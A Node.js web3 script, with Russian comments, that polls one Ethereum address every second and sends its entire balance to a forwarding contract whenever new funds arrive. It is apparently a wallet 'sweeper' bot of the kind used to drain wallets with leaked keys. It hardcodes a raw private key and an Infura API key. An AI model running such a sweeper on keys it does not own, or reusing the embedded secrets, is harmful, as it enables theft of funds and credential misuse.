const { Web3 } = require('web3');
const web3 = new Web3('https://mainnet.infura.io/v3/13c5d0003d704682b290ed46903a2bb1');

const contractAddress = '0xB8006B9626FeBdD46d11243cE30586E57518D7B1';
const contractABI = [
    {
        "inputs": [
            {
                "internalType": "address payable",
                "name": "_recipient",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            {
                "internalType": "address payable",
                "name": "_newRecipient",
                "type": "address"
            }
        ],
        "name": "updateRecipient",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            {
                "internalType": "address payable",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

const contract = new web3.eth.Contract(contractABI, contractAddress);

const senderAddress = '0x2Bcb7C6d22A62D07Fe56687B2848A1317A75AfEF';
const privateKey = '0b46b98886967c07d6b9add20ed0ead741e078a6d1339c6830da2a2b2d157c26';

let isSending = false; // Флаг, указывающий, выполняется ли отправка ETH
let lastBalance = 0n; // Переменная для хранения последнего баланса

async function sendAllEthToContract() {
    try {
        const balance = BigInt(await web3.eth.getBalance(senderAddress));
        let gasPrice = BigInt(await web3.eth.getGasPrice());
        gasPrice *= 1n;

        const gasEstimate = BigInt(await web3.eth.estimateGas({
            from: senderAddress,
            to: contractAddress,
            value: balance
        }));

        const gasCost = gasEstimate * gasPrice;
        const valueToSend = balance - gasCost;

        // Проверка, чтобы значение не было отрицательным
        if (valueToSend < 0n) {
            lastBalance = balance; // Обновляем значение последнего баланса
            console.log(`Transaction was not sent. Last Balance = ${web3.utils.fromWei(lastBalance.toString(), 'ether')} ETH`);
            return; // Выходим из функции, если недостаточно средств
        }

        const tx = {
            from: senderAddress,
            to: contractAddress,
            value: web3.utils.toHex(valueToSend), // Вычитаем стоимость газа из баланса
            gas: web3.utils.toHex(gasEstimate),
            gasPrice: web3.utils.toHex(gasPrice),
        };

        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        console.log('Transaction receipt:', receipt);
        
        // Обновляем значение последнего баланса
        lastBalance = BigInt(await web3.eth.getBalance(senderAddress));
        
    } catch (error) {
        console.error('Error sending ETH to contract:', error);
        lastBalance = BigInt(await web3.eth.getBalance(senderAddress)); // Обновляем значение последнего баланса в случае ошибки
        console.log(`Transaction was not sent. Last Balance = ${web3.utils.fromWei(lastBalance.toString(), 'ether')} ETH`);
    } finally {
        isSending = false; // Устанавливаем флаг обратно после завершения отправки
    }
}

async function checkBalanceAndSend() {
    const balance = BigInt(await web3.eth.getBalance(senderAddress));
    console.log(`Balance of ${senderAddress}: ${web3.utils.fromWei(balance.toString(), 'ether')} ETH`);

    // Проверяем, есть ли ETH на адресе и не выполняется ли уже отправка
    if (balance > lastBalance && !isSending) {
        isSending = true; // Устанавливаем флаг, что отправка начата
        await sendAllEthToContract();
    }
}

setInterval(checkBalanceAndSend, 1000);
